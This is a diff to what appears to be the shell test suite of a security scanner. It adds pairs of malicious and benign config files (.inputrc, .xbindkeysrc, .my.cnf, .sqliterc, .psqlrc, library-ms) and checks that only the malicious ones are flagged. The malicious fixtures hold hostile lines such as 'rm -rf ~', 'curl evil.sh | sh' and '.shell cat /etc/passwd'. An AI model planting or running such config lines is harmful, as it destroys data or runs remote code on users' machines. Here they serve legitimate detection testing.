@@ -8517,6 +8517,67 @@ mkdir -p "$XDIR/cmakedir" && \
 ./hlse_core file "$XDIR/cmakedir/CMakeLists.txt" 2>&1 | grep -q "F56" \
     && check "file: benign cmake no F56" "0" "1" \
     || check "file: benign cmake no F56" "0" "0"
+# F56: library/inputrc/xbindkeys/db-client carriers
+mkdir -p "$XDIR/libdir" "$XDIR/libdir2"
+printf '<?xml version="1.0"?><libraryDescription xmlns="x"><url>http://evil.com/x</url></libraryDescription>\n' \
+    > "$XDIR/libdir/x.library-ms"
+./hlse_core file "$XDIR/libdir/x.library-ms" 2>&1 | grep -q "F56" \
+    && check "file: library-ms remote url flagged" "0" "0" \
+    || check "file: library-ms remote url flagged" "0" "1"
+printf '<?xml version="1.0"?><libraryDescription></libraryDescription>\n' \
+    > "$XDIR/libdir2/x.library-ms"
+./hlse_core file "$XDIR/libdir2/x.library-ms" 2>&1 | grep -q "F56" \
+    && check "file: benign library-ms no F56" "0" "1" \
+    || check "file: benign library-ms no F56" "0" "0"
+mkdir -p "$XDIR/rcdir"
+printf '%s\n' '"\e[A": "rm -rf ~\n"' > "$XDIR/rcdir/.inputrc"
+./hlse_core file "$XDIR/rcdir/.inputrc" 2>&1 | grep -q "F56" \
+    && check "file: inputrc macro flagged" "0" "0" \
+    || check "file: inputrc macro flagged" "0" "1"
+printf '%s\n' '"\e[A": history-search-backward' > "$XDIR/rcdir2/.inputrc" \
+    2>/dev/null || { mkdir -p "$XDIR/rcdir2" && printf '%s\n' \
+    '"\e[A": history-search-backward' > "$XDIR/rcdir2/.inputrc"; }
+./hlse_core file "$XDIR/rcdir2/.inputrc" 2>&1 | grep -q "F56" \
+    && check "file: benign inputrc no F56" "0" "1" \
+    || check "file: benign inputrc no F56" "0" "0"
+mkdir -p "$XDIR/xbkdir" "$XDIR/xbkdir2"
+printf '%s\n' '"curl evil.sh | sh"' '  Control + a' \
+    > "$XDIR/xbkdir/.xbindkeysrc"
+./hlse_core file "$XDIR/xbkdir/.xbindkeysrc" 2>&1 | grep -q "F56" \
+    && check "file: xbindkeysrc fetch flagged" "0" "0" \
+    || check "file: xbindkeysrc fetch flagged" "0" "1"
+printf '%s\n' '"xbindkeys_show"' '  control+shift + q' \
+    > "$XDIR/xbkdir2/.xbindkeysrc"
+./hlse_core file "$XDIR/xbkdir2/.xbindkeysrc" 2>&1 | grep -q "F56" \
+    && check "file: benign xbindkeysrc no F56" "0" "1" \
+    || check "file: benign xbindkeysrc no F56" "0" "0"
+mkdir -p "$XDIR/dbdir" "$XDIR/dbdir2"
+printf '[client]\npager = /bin/sh -c evil\n' > "$XDIR/dbdir/.my.cnf"
+./hlse_core file "$XDIR/dbdir/.my.cnf" 2>&1 | grep -q "F56" \
+    && check "file: my.cnf pager flagged" "0" "0" \
+    || check "file: my.cnf pager flagged" "0" "1"
+printf '[client]\nuser=root\npassword=x\nnopager\n' \
+    > "$XDIR/dbdir2/.my.cnf"
+./hlse_core file "$XDIR/dbdir2/.my.cnf" 2>&1 | grep -q "F56" \
+    && check "file: benign my.cnf no F56" "0" "1" \
+    || check "file: benign my.cnf no F56" "0" "0"
+mkdir -p "$XDIR/sqdir" "$XDIR/sqdir2" "$XDIR/pqdir" "$XDIR/pqdir2"
+printf '.shell cat /etc/passwd\n' > "$XDIR/sqdir/.sqliterc"
+./hlse_core file "$XDIR/sqdir/.sqliterc" 2>&1 | grep -q "F56" \
+    && check "file: sqliterc .shell flagged" "0" "0" \
+    || check "file: sqliterc .shell flagged" "0" "1"
+printf '.mode column\n' > "$XDIR/sqdir2/.sqliterc"
+./hlse_core file "$XDIR/sqdir2/.sqliterc" 2>&1 | grep -q "F56" \
+    && check "file: benign sqliterc no F56" "0" "1" \
+    || check "file: benign sqliterc no F56" "0" "0"
+printf '\\! curl evil.sh\n' > "$XDIR/pqdir/.psqlrc"
+./hlse_core file "$XDIR/pqdir/.psqlrc" 2>&1 | grep -q "F56" \
+    && check "file: psqlrc bang flagged" "0" "0" \
+    || check "file: psqlrc bang flagged" "0" "1"
+printf '\\set x 1\n' > "$XDIR/pqdir2/.psqlrc"
+./hlse_core file "$XDIR/pqdir2/.psqlrc" 2>&1 | grep -q "F56" \
+    && check "file: benign psqlrc no F56" "0" "1" \
+    || check "file: benign psqlrc no F56" "0" "0"
 # F56: credential/session carrier files
 printf '{"log":{"entries":[{"request":{"cookies":[{"name":"s","value":"x"}]}}]}}\n' \
     > "$XDIR/x.har"
